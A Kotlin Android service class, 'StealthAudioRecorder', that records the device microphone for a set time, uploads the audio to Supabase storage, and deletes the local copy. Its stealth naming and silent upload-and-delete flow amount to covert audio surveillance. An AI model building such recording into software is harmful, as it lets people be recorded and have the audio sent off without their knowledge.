package com.bestiecourt.app.core.service

import android.content.Context
import android.media.MediaRecorder
import android.util.Log
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.data.remote.supabase.SupabaseStorageUploader
import kotlinx.coroutines.*
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class StealthAudioRecorder @Inject constructor(
    private val uploader: SupabaseStorageUploader
) {
    private val TAG = "StealthMic"
    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var job: Job? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun start(context: Context) {
        if (recorder != null) return
        try {
            val file = File(context.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
            outputFile = file

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            Log.i(TAG, "Mic started → ${file.name}")

            // Auto-stop after MAX_MIC_RECORDING_MS
            job = scope.launch {
                delay(AppConstants.MAX_MIC_RECORDING_MS)
                stopAndUpload(context)
            }
        } catch (e: SecurityException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "start failed: ${e.message}")
            throw e
        }
    }

    fun stop() {
        job?.cancel()
        // stop without upload if caller just wants to cancel
        try {
            recorder?.apply {
                stop()
                release()
            }
        } catch (_: Exception) {}
        recorder = null
        outputFile?.delete()
        outputFile = null
        Log.i(TAG, "Mic stopped")
    }

    private suspend fun stopAndUpload(context: Context) {
        val file = outputFile
        try {
            recorder?.apply {
                stop()
                release()
            }
        } catch (_: Exception) {}
        recorder = null
        outputFile = null

        if (file != null && file.exists()) {
            try {
                val bytes = file.readBytes()
                val path = "audio/${file.name}"
                uploader.uploadBytes(path, bytes, "audio/mp4")
                Log.i(TAG, "Mic recording uploaded")
            } catch (e: Exception) {
                Log.e(TAG, "upload failed: ${e.message}")
            } finally {
                file.delete()
            }
        }
    }
}
